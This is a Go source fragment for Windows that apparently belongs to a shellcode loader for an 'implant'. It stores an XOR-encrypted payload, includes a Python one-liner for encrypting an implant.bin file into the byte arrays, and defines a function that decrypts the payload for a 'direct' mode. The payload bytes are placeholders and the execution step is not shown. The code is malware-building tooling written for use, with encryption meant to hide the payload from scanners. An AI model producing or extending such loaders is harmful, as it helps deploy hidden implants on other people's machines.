//go:build windows

package main

// xorKey and encShellcode hold the encrypted payload for -mode direct.
// Replace both before compiling with:
//
//   python3 -c "
//   import os, sys
//   key = os.urandom(32)
//   sc  = open(sys.argv[1], 'rb').read()
//   enc = bytes(b ^ key[i % len(key)] for i, b in enumerate(sc))
//   print('var xorKey = []byte{' + ', '.join(hex(b) for b in key) + '}')
//   print('var encShellcode = []byte{' + ', '.join(hex(b) for b in enc) + '}')
//   " implant.bin
var xorKey = []byte{0x00}

var encShellcode = []byte{0x00}

func loadDirect() []byte {
	return xorDecrypt(encShellcode, xorKey)
}
